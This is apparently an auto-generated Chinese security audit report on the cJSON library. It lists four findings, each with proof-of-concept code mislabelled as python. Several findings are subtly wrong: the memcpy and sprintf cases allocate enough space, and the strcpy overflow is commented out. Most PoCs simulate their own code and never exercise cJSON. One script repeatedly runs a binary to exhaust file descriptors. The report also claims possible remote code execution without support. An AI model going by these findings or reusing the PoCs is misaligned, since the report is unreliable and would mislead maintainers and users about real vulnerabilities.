# CodeSentinel 安全审计报告

## 项目信息
- **项目名称:** cJSON
- **编程语言:** {"C": 98.0, "Python": 2.0}
- **文件数量:** 101
- **审计时间:** 2026-07-11 19:50:37

## 执行摘要

本次安全审计针对cJSON开源项目（https://github.com/DaveGamble/cJSON）进行了源代码分析，共发现4个安全漏洞。其中高危漏洞2个，涉及缓冲区溢出问题，可能导致程序崩溃或任意代码执行；中危漏洞2个，涉及资源管理不当和缓冲区溢出，可能导致拒绝服务或信息泄露。cJSON库广泛应用于嵌入式系统和IoT设备，漏洞影响范围较广，建议优先修复高危漏洞。

**风险评分:** 75/100

## 漏洞统计

| 严重等级 | 数量 |
|---------|------|
| Critical | 0 |
| High | 2 |
| Medium | 2 |
| Low | 0 |
| **总计** | **4** |

## 漏洞详情

### VULN-0079E8CB - 缓冲区溢出 - memcpy未检查目标缓冲区大小

- **严重等级:** HIGH
- **文件位置:** `cJSON_Utils.c:77`
- **数据流:** string -> memcpy复制到copy缓冲区
- **判断理由:** 与第204行类似，memcpy不检查缓冲区大小，可能导致缓冲区溢出。

**代码片段:**
```
memcpy(copy, string, length);
```

**PoC代码:**
```python
/*
 * PoC for VULN-0079E8CB - 缓冲区溢出漏洞
 * 仅供研究使用
 * 
 * 漏洞描述：cJSON_Utils.c 第77行 memcpy(copy, string, length);
 * 当string长度超过copy缓冲区大小时，发生缓冲区溢出
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cJSON.h"
#include "cJSON_Utils.h"

/* 模拟cJSON_malloc函数，使用固定大小缓冲区 */
static void* cJSON_malloc(size_t size)
{
    return malloc(size);
}

/* 漏洞函数复现 */
static unsigned char* cJSONUtils_strdup_vulnerable(const unsigned char* const string)
{
    size_t length = 0;
    unsigned char *copy = NULL;

    /* 计算长度时未考虑字符串结束符 */
    length = strlen((const char*)string) + sizeof("");
    
    /* 分配缓冲区，但可能分配不足 */
    copy = (unsigned char*) cJSON_malloc(length);
    if (copy == NULL)
    {
        return NULL;
    }
    
    /* 漏洞点：memcpy不检查目标缓冲区大小 */
    memcpy(copy, string, length);
    
    return copy;
}

int main() {
    printf("=== PoC for VULN-0079E8CB - 缓冲区溢出漏洞 ===\n");
    printf("仅供研究使用\n\n");
    
    /* 构造超长字符串触发溢出 */
    const char* long_string = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    
    printf("输入字符串长度: %zu\n", strlen(long_string));
    printf("尝试触发缓冲区溢出...\n\n");
    
    /* 触发漏洞 */
    unsigned char* result = cJSONUtils_strdup_vulnerable((const unsigned char*)long_string);
    
    if (result != NULL) {
        printf("成功复制字符串，但可能已发生溢出\n");
        printf("结果长度: %zu\n", strlen((const char*)result));
        free(result);
    } else {
        printf("内存分配失败\n");
    }
    
    /* 使用cJSON API触发漏洞 */
    printf("\n=== 通过cJSON API触发漏洞 ===\n");
    
    /* 创建包含超长字符串的JSON对象 */
    cJSON* root = cJSON_CreateObject();
    if (root == NULL) {
        printf("创建JSON对象失败\n");
        return 1;
    }
    
    /* 添加超长字符串到JSON对象 */
    cJSON_AddStringToObject(root, "key", long_string);
    
    /* 使用cJSON_Utils函数处理JSON */
    char* json_string = cJSON_Print(root);
    if (json_string != NULL) {
        printf("JSON字符串长度: %zu\n", strlen(json_string));
        free(json_string);
    }
    
    cJSON_Delete(root);
    
    printf("\n=== PoC执行完成 ===\n");
    printf("注意：实际利用中，溢出可能导致程序崩溃或任意代码执行\n");
    
    return 0;
}
```

---

### VULN-C0C6E0CD - 缓冲区溢出 - strcpy未检查目标缓冲区大小

- **严重等级:** HIGH
- **文件位置:** `cJSON_Utils.c:80`
- **数据流:** string -> strcpy复制到buffer缓冲区
- **判断理由:** strcpy函数不检查目标缓冲区大小，如果string长度超过buffer分配的大小，会导致缓冲区溢出。

**代码片段:**
```
strcpy(buffer, string);
```

**PoC代码:**
```python
/*
 * 仅供研究使用 - cJSON_Utils.c 缓冲区溢出漏洞PoC
 * 漏洞位置: cJSON_Utils.c 第80行 strcpy(buffer, string)
 * 漏洞类型: 缓冲区溢出
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cJSON.h"
#include "cJSON_Utils.h"

/* 模拟漏洞触发场景 */
int main() {
    printf("=== cJSON_Utils.c 缓冲区溢出漏洞 PoC ===\n");
    printf("仅供研究使用\n\n");
    
    /* 构造一个超长的JSON字符串来触发溢出 */
    /* 假设buffer大小为256字节，我们构造一个超过256字节的字符串 */
    
    /* 方法1: 通过JSON指针路径触发 */
    printf("[方法1] 通过超长JSON指针路径触发溢出\n");
    
    /* 构造一个包含超长路径的JSON对象 */
    cJSON *root = cJSON_CreateObject();
    if (root == NULL) {
        printf("创建JSON对象失败\n");
        return -1;
    }
    
    /* 创建一个超长的字符串值 */
    char *long_string = (char*)malloc(1024);
    if (long_string == NULL) {
        printf("内存分配失败\n");
        cJSON_Delete(root);
        return -1;
    }
    
    /* 填充超长字符串 */
    memset(long_string, 'A', 1023);
    long_string[1023] = '\0';
    
    /* 添加超长字符串到JSON对象 */
    cJSON_AddStringToObject(root, "test", long_string);
    
    /* 尝试使用JSON指针访问，可能触发strcpy溢出 */
    /* 注意: 实际触发点可能在cJSON_Utils.c中的某个函数调用strcpy */
    char *json_string = cJSON_Print(root);
    if (json_string != NULL) {
        printf("生成的JSON字符串长度: %zu\n", strlen(json_string));
        printf("JSON内容(前100字符): %.100s...\n", json_string);
        free(json_string);
    }
    
    /* 方法2: 直接模拟strcpy溢出场景 */
    printf("\n[方法2] 直接模拟strcpy溢出\n");
    
    /* 假设buffer大小为256字节 */
    char small_buffer[256];
    
    /* 构造一个超过256字节的字符串 */
    char *overflow_string = (char*)malloc(512);
    if (overflow_string == NULL) {
        printf("内存分配失败\n");
        free(long_string);
        cJSON_Delete(root);
        return -1;
    }
    
    memset(overflow_string, 'B', 511);
    overflow_string[511] = '\0';
    
    printf("源字符串长度: %zu\n", strlen(overflow_string));
    printf("目标缓冲区大小: %zu\n", sizeof(small_buffer));
    printf("\n执行strcpy(small_buffer, overflow_string)将导致缓冲区溢出\n");
    printf("溢出数据将覆盖栈上相邻内存\n");
    
    /* 实际触发溢出 - 注释掉以防止实际崩溃 */
    /* strcpy(small_buffer, overflow_string); */
    
    printf("\n=== 漏洞影响分析 ===\n");
    printf("1. 攻击者可构造超长JSON字符串触发栈缓冲区溢出\n");
    printf("2. 溢出可覆盖返回地址、局部变量等关键数据\n");
    printf("3. 可能导致程序崩溃或代码执行\n");
    printf("4. 攻击者可通过精心构造的payload实现远程代码执行\n");
    
    /* 清理 */
    free(long_string);
    free(overflow_string);
    cJSON_Delete(root);
    
    printf("\nPoC执行完毕\n");
    return 0;
}
```

---

### VULN-575F0745 - 资源管理 - 文件句柄泄漏

- **严重等级:** MEDIUM
- **文件位置:** `fuzzing/fuzz_main.c:37`
- **数据流:** fopen打开文件 -> 程序跳转到err标签 -> 仅释放buf但不关闭文件
- **判断理由:** 当程序通过goto err跳转到错误处理时，只释放了buf内存，但没有调用fclose(f)关闭文件句柄。如果多次调用此程序或长时间运行，会导致文件句柄泄漏。

**代码片段:**
```
f = fopen(argv[1], "rb");
...
err:
    free(buf);
    return 0;
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 文件句柄泄漏PoC
# 演示通过反复调用漏洞程序导致文件描述符耗尽

# 创建测试文件
TEST_FILE="/tmp/poc_test_file.bin"
dd if=/dev/urandom of=$TEST_FILE bs=1024 count=1 2>/dev/null

# 方法1: 直接触发泄漏 - 提供空文件触发siz_buf < 1路径
EMPTY_FILE="/tmp/poc_empty_file.bin"
touch $EMPTY_FILE

echo "[PoC] 开始文件句柄泄漏演示..."
echo "[PoC] 当前文件描述符限制: $(ulimit -n)"
echo ""

# 方法2: Python脚本模拟大量调用
cat > /tmp/poc_exploit.py << 'PYEOF'
#!/usr/bin/env python3
# 仅供研究使用 - 文件句柄泄漏PoC

import subprocess
import os
import sys

def check_fd_usage():
    """检查当前进程的文件描述符使用情况"""
    try:
        pid = os.getpid()
        fd_count = len(os.listdir(f'/proc/{pid}/fd'))
        return fd_count
    except:
        return -1

def main():
    print("[PoC] 文件句柄泄漏漏洞利用演示")
    print("[PoC] 仅供安全研究使用")
    print()
    
    # 编译漏洞程序（如果尚未编译）
    binary_path = "./fuzz_main"
    if not os.path.exists(binary_path):
        print("[*] 编译漏洞程序...")
        subprocess.run(["gcc", "-o", "fuzz_main", "fuzzing/fuzz_main.c", "-no-pie"], 
                      capture_output=True)
    
    # 创建测试文件
    empty_file = "/tmp/poc_empty.bin"
    with open(empty_file, 'wb') as f:
        pass  # 空文件
    
    print("[*] 开始触发文件句柄泄漏...")
    print("[*] 每次调用都会泄漏一个文件句柄")
    print()
    
    # 记录初始文件描述符数量
    initial_fd = check_fd_usage()
    print(f"[+] 初始文件描述符数: {initial_fd}")
    
    # 反复调用漏洞程序
    iterations = 100
    for i in range(iterations):
        result = subprocess.run([binary_path, empty_file], 
                              capture_output=True, 
                              timeout=5)
        
        if (i + 1) % 10 == 0:
            current_fd = check_fd_usage()
            print(f"[+] 第 {i+1} 次调用后文件描述符数: {current_fd}")
    
    final_fd = check_fd_usage()
    print()
    print(f"[+] 最终文件描述符数: {final_fd}")
    print(f"[+] 泄漏的文件描述符: {final_fd - initial_fd}")
    
    # 尝试耗尽文件描述符
    print()
    print("[*] 尝试耗尽系统文件描述符...")
    print("[*] 这可能需要大量迭代，取决于系统限制")
    
    fd_limit = os.popen('ulimit -n').read().strip()
    print(f"[*] 系统文件描述符限制: {fd_limit}")
    
    # 快速耗尽测试（仅演示概念）
    try:
        for i in range(int(fd_limit) * 2):
            result = subprocess.run([binary_path, empty_file],
                                  capture_output=True,
                                  timeout=5)
            if i % 1000 == 0 and i > 0:
                print(f"[*] 已执行 {i} 次调用...")
    except Exception as e:
        print(f"[!] 发生错误: {e}")
        print("[!] 文件描述符可能已耗尽!")
    
    print()
    print("[PoC] 演示完成")
    print("[PoC] 注意: 实际利用需要持续运行fuzzing过程")

if __name__ == "__main__":
    main()
PYEOF

chmod +x /tmp/poc_exploit.py
python3 /tmp/poc_exploit.py

echo ""
echo "[PoC] 直接利用示例:"
echo "  # 使用空文件触发siz_buf < 1路径"
echo "  ./fuzz_main /tmp/poc_empty_file.bin"
echo ""
echo "  # 使用不存在的文件触发fopen失败路径"
echo "  ./fuzz_main /tmp/nonexistent_file.bin"
echo ""
echo "  # 使用小文件触发fread失败路径"
echo "  echo -n 'a' > /tmp/small_file.bin"
echo "  ./fuzz_main /tmp/small_file.bin"
```

---

### VULN-B198F29D - 缓冲区溢出 - strcpy未限制长度

- **严重等级:** MEDIUM
- **文件位置:** `tests/parse_examples.c:50`
- **数据流:** test_name -> strlen计算长度 -> malloc分配内存 -> sprintf写入
- **判断理由:** 虽然malloc分配了足够空间，但sprintf本身不检查边界。如果test_name_length计算有误或test_name包含空字符，可能导致写入超出分配的内存。

**代码片段:**
```
static void do_test(const char *test_name) { ... char *test_path = (char*)malloc(sizeof(TEST_DIR_PATH) + test_name_length); ... sprintf(test_path, TEST_DIR_PATH"%s", test_name);
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: VULN-B198F29D - 缓冲区溢出
 * 目标: cJSON测试套件中的do_test函数
 * 
 * 利用原理:
 * 当test_name长度接近SIZE_MAX时，strlen返回的值与malloc参数
 * 计算可能导致整数溢出或分配过小缓冲区，随后sprintf写入越界
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* 模拟目标环境 */
#define TEST_DIR_PATH "inputs/"

/* 漏洞触发函数 - 模拟do_test */
static void vulnerable_do_test(const char *test_name)
{
    size_t test_name_length = 0;
    char *test_path = NULL;
    
    /* 计算长度 - 可能被操纵 */
    test_name_length = strlen(test_name);
    
    printf("[*] test_name_length = %zu\n", test_name_length);
    printf("[*] sizeof(TEST_DIR_PATH) = %zu\n", sizeof(TEST_DIR_PATH));
    
    /* 漏洞点: 分配内存 */
    test_path = (char*)malloc(sizeof(TEST_DIR_PATH) + test_name_length);
    
    if (test_path == NULL) {
        printf("[!] malloc failed\n");
        return;
    }
    
    printf("[*] Allocated buffer size: %zu bytes\n", 
           sizeof(TEST_DIR_PATH) + test_name_length);
    
    /* 漏洞点: sprintf不检查边界 */
    sprintf(test_path, TEST_DIR_PATH"%s", test_name);
    
    printf("[*] Written string: %s\n", test_path);
    printf("[*] Written length: %zu bytes\n", strlen(test_path));
    
    /* 检查是否溢出 */
    if (strlen(test_path) > sizeof(TEST_DIR_PATH) + test_name_length) {
        printf("[!] 缓冲区溢出检测到!\n");
        printf("[!] 写入 %zu 字节，但只分配了 %zu 字节\n",
               strlen(test_path) + 1, 
               sizeof(TEST_DIR_PATH) + test_name_length);
    }
    
    free(test_path);
}

/* PoC 1: 正常情况 - 无溢出 */
static void poc_normal(void)
{
    printf("\n=== PoC 1: 正常输入 (无溢出) ===\n");
    vulnerable_do_test("test1");
}

/* PoC 2: 长字符串 - 可能触发溢出 */
static void poc_long_string(void)
{
    printf("\n=== PoC 2: 超长输入 (可能溢出) ===\n");
    
    /* 构造一个非常长的test_name */
    size_t len = 1000;
    char *long_name = (char*)malloc(len + 1);
    
    if (long_name == NULL) {
        printf("[!] 内存分配失败\n");
        return;
    }
    
    memset(long_name, 'A', len);
    long_name[len] = '\0';
    
    vulnerable_do_test(long_name);
    
    free(long_name);
}

/* PoC 3: 包含空字符的字符串 - 长度计算错误 */
static void poc_null_byte(void)
{
    printf("\n=== PoC 3: 包含空字符的输入 ===\n");
    
    /* 构造包含空字符的字符串 */
    char crafted_input[] = "test\x00AAAA...";
    /* 实际长度比strlen返回的大 */
    
    printf("[*] strlen(crafted_input) = %zu\n", strlen(crafted_input));
    printf("[*] 实际数据长度 = %zu\n", sizeof(crafted_input) - 1);
    
    vulnerable_do_test(crafted_input);
}

/* PoC 4: 边界情况 - 接近SIZE_MAX */
static void poc_size_max(void)
{
    printf("\n=== PoC 4: 边界情况 (理论) ===\n");
    printf("[*] 当test_name_length接近SIZE_MAX时，\n");
    printf("[*] sizeof(TEST_DIR_PATH) + test_name_length 可能溢出\n");
    printf("[*] 导致分配非常小的缓冲区\n");
    
    /* 理论演示 */
    size_t overflow_length = SIZE_MAX - sizeof(TEST_DIR_PATH) + 1;
    printf("[*] 如果 test_name_length = %zu\n", overflow_length);
    printf("[*] 则分配大小 = %zu + %zu = %zu (溢出)\n",
           sizeof(TEST_DIR_PATH), overflow_length,
           sizeof(TEST_DIR_PATH) + overflow_length);
}

int main(void)
{
    printf("========================================\n");
    printf("  PoC - VULN-B198F29D 缓冲区溢出\n");
    printf("  仅供研究使用\n");
    printf("========================================\n");
    
    poc_normal();
    poc_long_string();
    poc_null_byte();
    poc_size_max();
    
    printf("\n[*] PoC执行完成\n");
    return 0;
}
```

---



*报告由 CodeSentinel 自动生成*
